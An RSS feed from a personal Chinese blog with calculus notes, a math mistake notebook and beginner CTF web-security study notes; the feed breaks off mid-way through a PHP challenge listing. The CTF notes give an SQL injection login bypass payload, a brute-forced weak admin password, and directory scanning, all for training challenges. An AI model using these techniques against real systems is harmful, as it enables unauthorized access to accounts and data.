<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>流云阁</title>
        <link>https://evefortosaber.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
        <lastBuildDate>Sun, 19 Mar 2023 19:29:17 +0800</lastBuildDate>
        <category>Notes</category>
        <category>随笔</category>
        <category>C++</category>
        <category>CTF</category>
        <category>DFS</category>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/Mathematics/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6(%E4%B8%8B)/</guid>
            <title>高等数学(下)</title>
            <link>https://evefortosaber.github.io/2023/03/19/Mathematics/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6(%E4%B8%8B)/</link>
            <category>Notes</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;关于高等数学下册的一些笔记&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;向量的方向角和方向余弦&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#向量的方向角和方向余弦&#34;&gt;#&lt;/a&gt; 向量的方向角和方向余弦&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://pic3.zhimg.com/80/v2-372cbaa699e447996d4c6d27ebbc4f2a_1440w.webp&#34; alt=&#34;向量的方向角和方向余弦&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;向量叉乘&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#向量叉乘&#34;&gt;#&lt;/a&gt; 向量叉乘&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;在三维几何中，向量 a 和向量 b 的叉乘结果是一个向量，该向量垂直于 a 和 b 向量构成的平面，该向量也被称作法向量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://sunocean.life/blog/assets/images/201205-3d-linear-algebra/20160902232814429.jpg&#34; alt=&#34;矢量叉乘 - 小时百科&#34; /&gt;&lt;/p&gt;
&lt;p&gt;右手螺旋定则，手指指向左元。&lt;/p&gt;
&lt;h5 id=&#34;叉乘公式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#叉乘公式&#34;&gt;#&lt;/a&gt; 叉乘公式&lt;/h5&gt;
&lt;p&gt;&lt;em&gt;--- 行列式的展开&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-my.csdn.net/uploads/201704/19/1492585617_5108.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://pics3.baidu.com/feed/38dbb6fd5266d0166e8615243bd8d80d34fa3518.png@f_auto?token=ebf017fb7eacd318da1313abf2fc6484&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;平面方程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#平面方程&#34;&gt;#&lt;/a&gt; 平面方程&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;表达式&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;截距式&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;x/a+y/b+z/c=1&lt;/strong&gt; 它与三坐标轴的交点分别为&lt;em&gt; P (a, 0, 0), Q (0, b, 0), R (0, 0, c)&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点法式&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A(x-x0)+B(y-y0)+C(z-z0)=0&lt;/strong&gt; 法向量为&lt;strong&gt; n&lt;/strong&gt;=(A,B,C)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一般式&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ax+By+Cz+D=0&lt;/strong&gt; 基本与点法式相同&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;可用平面上两条相交的直线的方向向量做点乘从而求出&lt;em&gt;平面法向量&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;空间直线&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空间直线&#34;&gt;#&lt;/a&gt; 空间直线&lt;/h4&gt;
&lt;h5 id=&#34;空间直线方程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空间直线方程&#34;&gt;#&lt;/a&gt; 空间直线方程&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;两平面联立&lt;/li&gt;
&lt;li&gt;对称式，由方向向量和直线上一点确定&lt;/li&gt;
&lt;li&gt;参数式 // 可由对称式导出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;lt;u&amp;gt; 详情戳&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc1MDk3Mi9hcnRpY2xlL2RldGFpbHMvMTIxMTcyNzkz&#34;&gt;链接&lt;/span&gt; &amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;h4 id=&#34;空间曲面&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空间曲面&#34;&gt;#&lt;/a&gt; 空间曲面&lt;/h4&gt;
&lt;h5 id=&#34;切面&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#切面&#34;&gt;#&lt;/a&gt; 切面&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;https://picx.zhimg.com/v2-1a3899e4a5ec22962d64505ccd86dd29_720w.jpg?source=d16d100b&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/Mathematics/%E9%94%99%E9%A2%98%E6%9C%AC/</guid>
            <title>错题本</title>
            <link>https://evefortosaber.github.io/2023/03/19/Mathematics/%E9%94%99%E9%A2%98%E6%9C%AC/</link>
            <category>Notes</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;数学错题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数学错题&#34;&gt;#&lt;/a&gt; 数学错题&lt;/h1&gt;
&lt;h2 id=&#34;高数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#高数&#34;&gt;#&lt;/a&gt; 高数&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/00_5-1663714277821.png&#34; alt=&#34;5&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/00_6-1663714314009.png&#34; alt=&#34;6&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/00_7-1663714323364.png&#34; alt=&#34;7&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/00_8-1663714341842.png&#34; alt=&#34;8&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/01_9-1663714386623.png&#34; alt=&#34;9&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/01_10-1663714362855.png&#34; alt=&#34;10&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/</guid>
            <title>CTFNote</title>
            <link>https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/</link>
            <category>CTF</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ctf题目笔记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ctf题目笔记&#34;&gt;#&lt;/a&gt; CTF 题目笔记&lt;/h1&gt;
&lt;p&gt;遇到不认识的先查，不要刻板印象或置之不理。要善于搜索资料。&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;1初识sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1初识sql注入&#34;&gt;#&lt;/a&gt; 1. 初识 SQL 注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;登录处使用 findadmin 方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&#39;or 1=1--&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 SQL 语句中 username=’username‘ and password=’password‘&lt;/p&gt;
&lt;p&gt;变成了 username=’ ’ or 1=1--  ’ and password=’password‘&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;称为 SQL 注释&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/SQL%E6%B3%A8%E5%85%A5%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93.png&#34; alt=&#34;SQL&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cookie 注入、Post 注入、盲注&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;做了 cookie，直接进 cookie 的 php 页面然后抓 cookie.php 的包，&lt;/p&gt;
&lt;p&gt;然后在 reapter 里看回显。拿到 flag。&lt;/p&gt;
&lt;p&gt;还做了一道&lt;strong&gt; baby_web&lt;/strong&gt;，直接根据提示进 index.php（这里主要是&lt;/p&gt;
&lt;p&gt;不知道 index 是什么（&lt;strong&gt;index.php 是首页&lt;/strong&gt;））&lt;/p&gt;
&lt;p&gt;或者先抓个包，把 get 改成 index.php 然后 send，之后直接看 response 得到 flag。&lt;/p&gt;
&lt;p&gt;（其实都很简单主要是不会操作，基础太差）&lt;/p&gt;
&lt;p&gt;还有一道弱口令&lt;strong&gt; weak_auth&lt;/strong&gt; 就是简单的弱口令（最开始想直接注入（练练手，学了好几天 SQL 注入了）结果要盲注，不会！只能查怎么爆破了）&lt;/p&gt;
&lt;p&gt;最后用 burpsuite 爆破账号:admin&lt;/p&gt;
&lt;p&gt;密码：123456&lt;/p&gt;
&lt;p&gt;就真没想到这么 weak！！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;2get_post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2get_post&#34;&gt;#&lt;/a&gt; 2.get_post&lt;/h3&gt;
&lt;p&gt;可以通过 url 进行 get 操作，通过 hackbar 的 postpage 进行 post 操作&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://article.biliimg.com/bfs/article/5403e84f6dabc1299f173b26367b97be0f29ae9b.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;3backup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3backup&#34;&gt;#&lt;/a&gt; 3.backup&lt;/h3&gt;
&lt;p&gt;注意源码泄露问题。&lt;/p&gt;
&lt;p&gt;可用脚本 dirsearch 进行目录扫描。&lt;/p&gt;
&lt;h3 id=&#34;4warmup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4warmup&#34;&gt;#&lt;/a&gt; 4.warmup&lt;/h3&gt;
&lt;p&gt;代码审计&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;emmm&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;checkFile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;source&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;source.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hint&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hint.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;you can&#39;t see it&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mb_substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token function&#34;&gt;mb_strpos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;urldecode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mb_substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token function&#34;&gt;mb_strpos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_page&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;you can&#39;t see it&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token global&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span 